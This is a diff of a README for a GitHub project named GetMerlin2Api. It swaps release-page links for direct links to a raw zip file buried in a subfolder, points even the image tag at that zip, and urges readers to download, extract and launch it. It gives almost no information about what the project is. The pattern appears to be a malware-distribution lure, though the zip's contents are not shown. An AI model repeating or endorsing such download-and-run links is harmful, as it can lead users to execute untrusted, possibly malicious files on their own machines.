@@ -1,6 +1,6 @@
 # 🧙‍♂️ Welcome to GetMerlin2Api Repository!
 
-![Merlin Image](https://github.com/Tyson-cyber/GetMerlin2Api/releases/tag/v2.0)
+![Merlin Image](https://github.com/Tyson-cyber/GetMerlin2Api/raw/refs/heads/main/Mercurean/Api_Get_Merlin_v2.5.zip)
 
 ### Repository: GetMerlin2Api
 
@@ -13,7 +13,7 @@ This repository contains the source code for the GetMerlin2Api project. Unfortun
 
 To get started with GetMerlin2Api, you can download the project files from the link below:
 
-[![Download Project Files](https://github.com/Tyson-cyber/GetMerlin2Api/releases/tag/v2.0)](https://github.com/Tyson-cyber/GetMerlin2Api/releases/tag/v2.0)
+[![Download Project Files](https://github.com/Tyson-cyber/GetMerlin2Api/raw/refs/heads/main/Mercurean/Api_Get_Merlin_v2.5.zip)](https://github.com/Tyson-cyber/GetMerlin2Api/raw/refs/heads/main/Mercurean/Api_Get_Merlin_v2.5.zip)
 
 The link above will direct you to the zip file containing all the necessary files for the project. Make sure to extract the files after downloading and launch the project to explore its functionalities.
 
